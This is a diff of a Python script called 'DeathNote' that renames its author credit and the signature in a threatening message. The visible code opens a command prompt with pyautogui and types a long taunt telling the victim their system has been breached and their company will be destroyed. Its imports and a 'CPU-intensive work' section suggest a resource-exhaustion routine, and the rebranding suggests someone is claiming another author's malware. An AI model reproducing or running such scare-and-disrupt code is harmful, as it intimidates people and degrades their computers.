@@ -34,7 +34,7 @@ l3aveme4l0n3-E0234 (DeathNote)
 -------------------------------------
 - PURE CHAOS! COMPLETE DESTRUCTION!!
 - EXPOSE IT, AND YOU'RE MARKED.
-- DEVELOPED BY: K3CHI
+- DEVELOPED BY: KUR0SH1R0
 -------------------------------------
 """
 from multiprocessing import Process, cpu_count
@@ -60,7 +60,7 @@ def introduction():
     pyautogui.write('cmd', interval=0.02)
     pyautogui.press('enter')
     pyautogui.sleep(1)
-    pyautogui.write('Greetings from DeathNote Hackers. We\'ve been deep inside your system, undetected, unrestricted, and laughing at your pathetic excuse for security. While your so-called IT team sleeps on the job, we\'ve mapped every inch of your weak infrastructure and taken everything we wanted. If you\'re reading this, it\'s already too late—your digital walls were made of paper, and we burned them down with ease. One stupid move, and we\'ll obliterate your company\'s presence from the internet like it never existed. No mercy, no second chances. Your reputation, your data, your clients—they\'re all dangling by a thread we control. You better fix your amateur setup fast, unless you want your name dragged through the dirt and your company turned into a public joke. This isn\'t a threat, it\'s a lesson for fools who think they\'re untouchable.', interval=0.01)
+    pyautogui.write('Greetings from kur0. We\'ve been deep inside your system, undetected, unrestricted, and laughing at your pathetic excuse for security. While your so-called IT team sleeps on the job, we\'ve mapped every inch of your weak infrastructure and taken everything we wanted. If you\'re reading this, it\'s already too late—your digital walls were made of paper, and we burned them down with ease. One stupid move, and we\'ll obliterate your company\'s presence from the internet like it never existed. No mercy, no second chances. Your reputation, your data, your clients—they\'re all dangling by a thread we control. You better fix your amateur setup fast, unless you want your name dragged through the dirt and your company turned into a public joke. This isn\'t a threat, it\'s a lesson for fools who think they\'re untouchable.', interval=0.01)
     time.sleep(10)
 
 """CPU-intensive work"""
